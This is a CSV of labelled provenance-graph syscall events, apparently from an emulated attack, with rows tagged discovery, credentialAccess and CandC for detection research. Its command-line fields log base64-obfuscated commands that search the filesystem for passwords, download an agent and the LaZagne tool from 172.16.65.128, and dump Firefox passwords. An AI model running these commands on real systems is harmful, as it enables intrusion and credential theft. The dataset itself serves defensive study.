id,type,from,to,uid,egid,exe,gid,euid,name,pid,seen time,source,ppid,command line,start time,event id,time,operation,path,subtype,permissions,epoch,version,flags,local address,remote port,protocol,remote address,local port,tgid,fd,mode,label,subLabel,window
,WasDerivedFrom,18c1d8e0ef95f2d4797d7379694ed7ef,ebf5d637441bc4066a1bf597c38a6805,,,,,,,1950.0,,syscall,,,,184454.0,1701581749.106,rename,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,aa5dd82aa9d7724dca9bca88a69ed619,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,184455.0,1701581749.11,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184457.0,1701581752.314,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184478.0,1701581756.138,unlink,,,,,,,,,,,,,,,0,0,28359695
0c0ee0cdbaf6ff815c7c47397cbb0d34,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,111519.0,1701581758.746,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359695
d59d492c02128c522433d3035ec73f6a,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,111519.0,,syscall,4127.0,"sh -c eval ""$(echo cHl0aG9uMyAtLXZlcnNpb247cHl0aG9uMiAtLXZlcnNpb247cHl0aG9uIC0tdmVyc2lvbg== | base64 --decode)""",1701581758.746,,,,,,,,,,,,,,,,,,1,discovery,28359695
,WasTriggeredBy,d59d492c02128c522433d3035ec73f6a,0c0ee0cdbaf6ff815c7c47397cbb0d34,,,,,,,,,syscall,,,,184480.0,1701581758.746,execve,,,,,,,,,,,,,,,0,0,28359695
,Used,d59d492c02128c522433d3035ec73f6a,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,184480.0,1701581758.746,load,,,,,,,,,,,,,,,0,0,28359695
,Used,d59d492c02128c522433d3035ec73f6a,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,184480.0,1701581758.746,load,,,,,,,,,,,,,,,0,0,28359695
fad1a4be732446a0c524897465946923,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,111522.0,1701581758.75,syscall,111520.0,,,,,,,,,,,,,,,,,,,,0,0,28359695
a4c55290c966db4710ebfb9e85eabc15,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,111522.0,,syscall,111520.0,base64 --decode,1701581758.75,,,,,,,,,,,,,,,,,,0,0,28359695
,WasTriggeredBy,a4c55290c966db4710ebfb9e85eabc15,fad1a4be732446a0c524897465946923,,,,,,,,,syscall,,,,184481.0,1701581758.75,execve,,,,,,,,,,,,,,,0,0,28359695
,Used,a4c55290c966db4710ebfb9e85eabc15,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,184481.0,1701581758.75,load,,,,,,,,,,,,,,,0,0,28359695
,Used,a4c55290c966db4710ebfb9e85eabc15,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,184481.0,1701581758.75,load,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184483.0,1701581759.366,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,188494.0,1701584763.25,unlink,,,,,,,,,,,,,,,0,0,28359746
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,188496.0,1701584767.083,unlink,,,,,,,,,,,,,,,0,0,28359746
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,188498.0,1701584770.911,unlink,,,,,,,,,,,,,,,0,0,28359746
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,188500.0,1701584774.731,unlink,,,,,,,,,,,,,,,0,0,28359746
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,188502.0,1701584778.547,unlink,,,,,,,,,,,,,,,0,0,28359746
f68023a08fafc1a4fde3232507bfe042,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,114311.0,1701584779.859,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359746
027fe5a95b9175029bc026d1a5f4c626,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,114311.0,,syscall,4127.0,"sh -c eval ""$(echo Z3JvdXBz | base64 --decode)""",1701584779.859,,,,,,,,,,,,,,,,,,1,discovery,28359746
,WasTriggeredBy,027fe5a95b9175029bc026d1a5f4c626,f68023a08fafc1a4fde3232507bfe042,,,,,,,,,syscall,,,,188504.0,1701584779.859,execve,,,,,,,,,,,,,,,0,0,28359746
,Used,027fe5a95b9175029bc026d1a5f4c626,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,188504.0,1701584779.859,load,,,,,,,,,,,,,,,0,0,28359746
8c71c9c9673eaf6a0e4fa839a030f12b,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,117576.0,1701588284.904,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359804
018c6f35dcd57b4e16bcfa7d4980ecf5,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,117576.0,,syscall,4127.0,"sh -c eval ""$(echo dW5hbWUgLWEgPj4gL3RtcC9UMTA4Mi50eHQ7IGlmIFsgLWYgL2V0Yy9sc2ItcmVsZWFzZSBdOyB0aGVuIGNhdCAvZXRjL2xzYi1yZWxlYXNlID4+IC90bXAvVDEwODIudHh0OyBmaTsgaWYgWyAtZiAvZXRjL3JlZGhhdC1yZWxlYXNlIF07IHRoZW4gY2F0IC9ldGMvcmVkaGF0LXJlbGVhc2UgPj4gL3RtcC9UMTA4Mi50eHQ7IGZpICAgOyBpZiBbIC1mIC9ldGMvaXNzdWUgXTsgdGhlbiBjYXQgL2V0Yy9pc3N1ZSA+PiAvdG1wL1QxMDgyLnR4dDsgZmk7IHVwdGltZSA+PiAvdG1wL1QxMDgyLnR4dDsgY2F0IC90bXAvVDEwODIudHh0IDI+L2Rldi9udWxs | base64 --decode)""",1701588284.904,,,,,,,,,,,,,,,,,,1,discovery,28359804
362506939a8fef3cc899a9f0e6872998,Process,,,1000.0,1000.0,/usr/bin/uname,1000.0,1000.0,uname,117580.0,1701588284.916,syscall,117576.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359804
356a81045b123654581a1973f27073f2,Process,,,1000.0,1000.0,/usr/bin/uname,1000.0,1000.0,uname,117580.0,,syscall,117576.0,uname -a,1701588284.916,,,,,,,,,,,,,,,,,,1,discovery,28359804
4f6cfeb7374fec23eb9facf8e514b302,Process,,,1000.0,1000.0,/usr/bin/cat,1000.0,1000.0,cat,117582.0,1701588284.984,syscall,117576.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359804
3b04dc1d7912e3a9546ab43ca8ff9b1d,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,120442.0,1701591523.348,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359858
c493fd20d1d3755fb68e60ce00588ca5,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,120442.0,,syscall,4127.0,"sh -c eval ""$(echo bHM= | base64 --decode)""",1701591523.348,,,,,,,,,,,,,,,,,,1,discovery,28359858
96bf930101c0c9c6a2e60f2bb2d0e024,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,128298.0,1701599346.569,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28359989
20049ea84690d61eea540134a7832edd,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,128298.0,,syscall,4127.0,"sh -c eval ""$(echo Z3JlcCAtcmkgcGFzc3dvcmQgLzsgZXhpdCAw | base64 --decode)""",1701599346.569,,,,,,,,,,,,,,,,,,1,credentialAccess,28359989
21c6b34371242e9c23d965670d317d8a,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,128302.0,1701599346.577,syscall,128298.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28359989
762a1d085b16cea9ff5b0ca3c771250c,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,128302.0,,syscall,128298.0,grep -ri password /,1701599346.577,,,,,,,,,,,,,,,,,,1,credentialAccess,28359989
5a3e6a0bccfbc74b7969a6dadc795b48,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,131906.0,1701603442.228,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,CandC,28360057
6a61b7dd7503c187f6a0937405759987,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,131906.0,,syscall,4127.0,"sh -c eval ""$(echo Y3VybCAtc08gaHR0cDovLzE3Mi4xNi42NS4xMjg6ODAwMC9zYW5kY2F0LmJhc2g7Y3VybCAtc08gaHR0cDovLzE3Mi4xNi42NS4xMjg6ODAwMC9MYVphZ25lLTIuNC41LnRhci5nejt0YXIgLXhmIExhWmFnbmUtMi40LjUudGFyLmd6 | base64 --decode)""",1701603442.228,,,,,,,,,,,,,,,,,,1,CandC,28360057
abb10f91b82cd2db95fa5a165ef5f6f0,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,131910.0,1701603442.232,syscall,131906.0,,,,,,,,,,,,,,,,,,,,1,CandC,28360057
f35251061094460185b68f9fed15ad9f,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,131910.0,,syscall,131906.0,curl -sO http://172.16.65.128:8000/sandcat.bash,1701603442.232,,,,,,,,,,,,,,,,,,1,CandC,28360057
f809897449ae0badd7ab714224ea2360,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,131911.0,1701603445.356,syscall,131906.0,,,,,,,,,,,,,,,,,,,,1,CandC,28360057
4a1337870ae8672dd516a972b77b9fb4,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,131911.0,,syscall,131906.0,curl -sO http://172.16.65.128:8000/LaZagne-2.4.5.tar.gz,1701603445.356,,,,,,,,,,,,,,,,,,1,CandC,28360057
5d502df7cf57cbe45c3c37b34d0ccd1b,Process,,,1000.0,1000.0,/usr/bin/tar,1000.0,1000.0,tar,131919.0,1701603450.864,syscall,131906.0,,,,,,,,,,,,,,,,,,,,1,CandC,28360057
659caf72a8d24cad1ed73d4679ebc5d5,Process,,,1000.0,1000.0,/usr/bin/tar,1000.0,1000.0,tar,131919.0,,syscall,131906.0,tar -xf LaZagne-2.4.5.tar.gz,1701603450.864,,,,,,,,,,,,,,,,,,1,CandC,28360057
5190881924a527920e89850931ab862b,Process,,,1000.0,1000.0,/usr/bin/gzip,1000.0,1000.0,gzip,131920.0,1701603450.868,syscall,131919.0,,,,,,,,,,,,,,,,,,,,1,CandC,28360057
09a92528db1c8403cb5e1578b364792b,Process,,,1000.0,1000.0,/usr/bin/gzip,1000.0,1000.0,gzip,131920.0,,syscall,131919.0,gzip -d,1701603450.868,,,,,,,,,,,,,,,,,,1,CandC,28360057
5d180a6b07ebbbb2c79fbf1dd7c8d2ff,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,135354.0,1701607258.786,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28360120
9771d87a666c61d765c53a1418f772d2,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,135354.0,,syscall,4127.0,"sh -c eval ""$(echo cHl0aG9uMyBMYVphZ25lLTIuNC41L0xpbnV4L2xhWmFnbmUucHkgYnJvd3NlcnMgLWZpcmVmb3ggPj4gL2hvbWUvZXJmYW4vc3RhZ2VkL2ZpcmVmb3hfcGFzc3dvcmQudHh0 | base64 --decode)""",1701607258.786,,,,,,,,,,,,,,,,,,1,credentialAccess,28360120
d6fb105f6cb390c06736382cac4b254c,Process,,,1000.0,1000.0,/usr/bin/python3.8,1000.0,1000.0,python3,135358.0,1701607258.878,syscall,135354.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,19451ba7925cd3d871c3d089664fee9c,5a24a74f30db5a90241223bb68f6758f,,,,,,,135358.0,,syscall,,,,231967.0,1701607258.878,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,41e1b8e0a415ccaa185e0cd4fd83a157,5a179a2cb99b1df0bd4f0eb31ef21c41,,,,,,,135358.0,,syscall,,,,231968.0,1701607258.878,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,e3a84aa8f2aeac52d7a4fdec5365b620,8de12f6572aebc2f0d9749b6d83c6001,,,,,,,135358.0,,syscall,,,,231969.0,1701607258.89,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,50ff15e3694ae70c7a3ecab6de084b0a,b33a26fb8c43e896cdf269438466b1f2,,,,,,,135358.0,,syscall,,,,231970.0,1701607258.906,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,3af889285916c5ac03009a70e9d85133,7ab78809071f5bde710caec74aeb3a7f,,,,,,,135358.0,,syscall,,,,231971.0,1701607258.91,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,a288def1d9313ffd5ae77fe522a8aea4,9a6c0090c82769ba2ed6233769c5fd2c,,,,,,,135358.0,,syscall,,,,231972.0,1701607258.914,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,6dff9e4e60d580f621873df7cfbe98c2,1d0390177147ffb944ef476de9aac9db,,,,,,,135358.0,,syscall,,,,231973.0,1701607258.918,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,56883a0a95af7904e14a04b2d8ebcde6,a53d831a5ce8c4cafbe20e6832fbcb90,,,,,,,135358.0,,syscall,,,,231974.0,1701607258.918,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,7c254a1a024716779a0c7bea7db6ae87,d3d9647f120c47c72f50e96b50eff550,,,,,,,135358.0,,syscall,,,,231975.0,1701607258.922,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,cfb46e586d94da8929b9339cf9185d40,faa25998ea8c8f50f49832ced73b462d,,,,,,,135358.0,,syscall,,,,231976.0,1701607258.922,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,56a5b7881372812c86445b8c0900b73b,03fea7fc098ab182530cfb7a6b72714d,,,,,,,135358.0,,syscall,,,,231977.0,1701607258.93,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,5052d9b6578f4d094c6b436319961bba,f84f6de65b641afa103b7b5d91d06dc5,,,,,,,135358.0,,syscall,,,,231978.0,1701607258.938,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,2750153d94cf4dc2e12f02f27087badd,2e6d766adbd65472a3055afe7d6d5b90,,,,,,,135358.0,,syscall,,,,231979.0,1701607258.946,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,723731aa37476874b136af1be3024953,39938675dfc0b47b20421798b47149e0,,,,,,,135358.0,,syscall,,,,231980.0,1701607258.946,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,6e69d5175c2b611a5cda8841e99c19d5,81d4d5038750183bb263e1a419dd6783,,,,,,,135358.0,,syscall,,,,231981.0,1701607258.966,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,9d0870821e0711f2c5088343c1ffca86,692ae13d8540f16135d31ecf877a7cf8,,,,,,,135358.0,,syscall,,,,231982.0,1701607258.97,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,2313493f21054502fdd05874db44b94a,d1acf3576c43c34993b76a389bb63233,,,,,,,135358.0,,syscall,,,,231983.0,1701607258.97,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,96690756697ea25c1adf86a37b431d66,568605ea17233a16d2c08de8f10da007,,,,,,,135358.0,,syscall,,,,231984.0,1701607258.97,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,ed0fddc1e2c17f125c48bcfbf6dca64c,c1ab87b72ffa08887bc36cea3b68606b,,,,,,,135358.0,,syscall,,,,231985.0,1701607259.018,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,89e41e8cbcd6319d3facfeb252e20d93,e7b1fdffb424d545a483b494510b6c3d,,,,,,,135358.0,,syscall,,,,231986.0,1701607259.022,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,ad06e7bec5a3cc018191abd69aded8c3,89f7f905bba653cfeb28af4657ac1bbf,,,,,,,135358.0,,syscall,,,,231987.0,1701607259.022,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,564d781c68fbd9e92fcf5b8dd3d4204f,ba7bfd162aa81c3da9720aeab4f6286e,,,,,,,135358.0,,syscall,,,,231988.0,1701607259.614,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,b392a2aabcab8c13ed8fc5db9db1a732,7e6c7e45824c9e820f00ffa77808b6aa,,,,,,,135358.0,,syscall,,,,231989.0,1701607259.63,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,8f39146d6076bda43009b109e383b943,4e4ed5411f44aac17ecabab3b5e8da99,,,,,,,135358.0,,syscall,,,,231990.0,1701607259.634,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,9ec32b26a3aad8925df668dae7803cde,ef7dbe6bb689ad3fdf3a1f76cf64eb34,,,,,,,135358.0,,syscall,,,,231991.0,1701607259.634,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,5f0a4a84231c3b80b96a8b677045d9f0,022afad3d51ebcef2542bd0eb2ac8c12,,,,,,,135358.0,,syscall,,,,231992.0,1701607259.678,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,5ddc245922228c85539b2711d6a8b606,90729f0a001fda06612ef01c9c1a7291,,,,,,,135358.0,,syscall,,,,231993.0,1701607259.678,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
703dccebd00efe352b1bfef739a86d50,Process,,,1000.0,1000.0,/usr/bin/uname,1000.0,1000.0,uname,135359.0,1701607259.682,syscall,135358.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28360120
4a60b3d97122aa04b6bbad1fd6843617,Process,,,1000.0,1000.0,/usr/bin/uname,1000.0,1000.0,uname,135359.0,,syscall,135358.0,uname -p,1701607259.682,,,,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,052b72408d443882ab632439c5f58de2,18891b466800f66c00de0fb4de376ae5,,,,,,,135358.0,,syscall,,,,231995.0,1701607259.694,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,929723c9adb99deb0b998e1d33716333,3209e1d5fa74becb2ab7a735a3c1c01f,,,,,,,135358.0,,syscall,,,,231996.0,1701607259.702,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,12fc3394288c98435655be8572f3ea3a,a885a90866a6152caa36c6d9ba246802,,,,,,,135358.0,,syscall,,,,231997.0,1701607259.702,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,26963a64835e5831ca93909fcc713790,73f97e4513465acfb74a7d6fc399de1e,,,,,,,135358.0,,syscall,,,,231998.0,1701607259.762,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,d980551dc370ed9047c5b4854c1ad1ed,ea714692a4efb13c8c794a38ada61afa,,,,,,,135358.0,,syscall,,,,231999.0,1701607259.794,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,9855e6dd285d9244f41c1efaa9328566,46abaa48351a0553d22f245b8afc76e3,,,,,,,135358.0,,syscall,,,,232000.0,1701607259.91,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,68190d4c22ce4c51cbbd1e7efaf2e094,128e3a6675210fb53503f4ea0a3980f5,,,,,,,135358.0,,syscall,,,,232001.0,1701607259.91,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,3577b803f8ad7cc7b9b4482ec00d8ec9,90390aa375b69afd158313f94a3488f2,,,,,,,135358.0,,syscall,,,,232002.0,1701607259.914,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,b87ad6f16e878cb53f32fef52be385f1,2d83ab42d2a6d55ab985604731a75abe,,,,,,,135358.0,,syscall,,,,232003.0,1701607259.914,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,ecfd54919f5109723b21a30284d4957c,1866b063aea25fcdf174286a52ff2036,,,,,,,135358.0,,syscall,,,,232004.0,1701607259.918,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,0040741b0d39fab4de67ff2bf728fb35,49452b5f75c8d64e35520d9669f60eb0,,,,,,,135358.0,,syscall,,,,232005.0,1701607259.918,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,cbb3523e5b3026ef6898f93b7300df9e,18b6edb8387366ae9b2776095d196b52,,,,,,,135358.0,,syscall,,,,232006.0,1701607259.922,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,d9fdf5c0bb8364c41330a40f1d4efd28,cab543cd4f9a111a2d723e5885b6ebc0,,,,,,,135358.0,,syscall,,,,232007.0,1701607259.922,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,eae8ed0eba1ab4d3008391dc4bfb4eea,44032ad8b774a89cdb3d497cc4132369,,,,,,,135358.0,,syscall,,,,232008.0,1701607259.942,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,ddd8536354062500b1cdac59cb77e9b8,ebe051bf8f016085e345343c444f815c,,,,,,,135358.0,,syscall,,,,232009.0,1701607259.942,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,435b960dc2b11c4b0013794dab17dc8f,8fdf7d0240491150a2d0d524e65360b5,,,,,,,135358.0,,syscall,,,,232010.0,1701607259.942,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,8c9e7e7a3d033788fac0a7b1d2a0d9ad,8c76edfb79d235a95eafec1229ca9428,,,,,,,135358.0,,syscall,,,,232011.0,1701607259.946,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,eb2dcddcf5dccd6a2bfbd4d13e38c5d4,35174d5de96d9afc1b76fb3216b24c6f,,,,,,,135358.0,,syscall,,,,232012.0,1701607259.946,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,cc706e14ab1fed2a2c5cb780a287c1a1,9953755441f2201f5833521ccacc255b,,,,,,,135358.0,,syscall,,,,232013.0,1701607259.95,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,fcc857da83d621f34b043d85a9d8957c,b745cb1384d90fcccf47d9a0c42f947d,,,,,,,135358.0,,syscall,,,,232014.0,1701607259.95,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,655d765f705391d7a5b0f9104dbfb27a,eb93af566e41ef3b970eb82bad97da4b,,,,,,,135358.0,,syscall,,,,232015.0,1701607259.95,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,a0c2dff7a086b99ec915eeff378ccd2b,34dccd60993c2740680701a3549c4157,,,,,,,135358.0,,syscall,,,,232016.0,1701607259.954,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,7124c09707fe775492caa59bf6465d08,016966da0755e0cc5f90ba79a11c7193,,,,,,,135358.0,,syscall,,,,232017.0,1701607259.954,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,a67b2196a6f75af5f088aedbdc40dbb7,f86e2f902ea85822fc5ef642f58a26bf,,,,,,,135358.0,,syscall,,,,232018.0,1701607259.954,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,fa73c6d376f8a01abeebee108a83fc31,9d8a867bc1f9cad855ff37e3bc95f682,,,,,,,135358.0,,syscall,,,,232019.0,1701607259.958,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,4b45db398c67c8532325196ad27e7d49,49fc330895cbc290f69c9b6597801669,,,,,,,135358.0,,syscall,,,,232020.0,1701607259.958,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,350f8afa736b6dc7e5b60a37e6664773,8a41f5d2880da8a73b27995bd1ea619b,,,,,,,135358.0,,syscall,,,,232021.0,1701607259.958,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,3c20c288d4259de05803d34ccb9ea362,2ea67e93d5ba2705db35d93bbb192d20,,,,,,,135358.0,,syscall,,,,232022.0,1701607259.962,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,b3c09c534a84457ec16a805f62d9bb40,936ec30b2e394f52d2e8c39d192f1de1,,,,,,,135358.0,,syscall,,,,232023.0,1701607259.962,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,6927d5ab8a50c1193e20ff5df7f5b9a5,08c7d0c979307ef226cf817487cb7f4b,,,,,,,135358.0,,syscall,,,,232024.0,1701607259.962,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,8ba021f10f885cefeb08da4f4f044d23,cd80946d9f043052a87b347aa2b113e9,,,,,,,135358.0,,syscall,,,,232025.0,1701607259.962,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,14d84bd4d4060ea61d5e2410f2366da6,95f4f48f862d470be74aa3cfd2efdf0a,,,,,,,135358.0,,syscall,,,,232026.0,1701607259.966,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,a25c928349ee78883ad08c5274a5f9e4,4d522202b26aa7a77ffa2f23e2631dd3,,,,,,,135358.0,,syscall,,,,232027.0,1701607259.966,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,d700bc37ee1c2c9c91e3d24960e8133a,65c4360c0b93dea1c2ca6d9648948f9f,,,,,,,135358.0,,syscall,,,,232028.0,1701607259.966,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,3b47f23e2db90f2fba85aace86ef0701,5c83a8243728dd3ecb8a4fba44ee89da,,,,,,,135358.0,,syscall,,,,232029.0,1701607259.966,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,309f962845738bf8d6a92e3d840baffa,b8fccdd29eba85b031413b79a50b38f8,,,,,,,135358.0,,syscall,,,,232030.0,1701607259.978,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
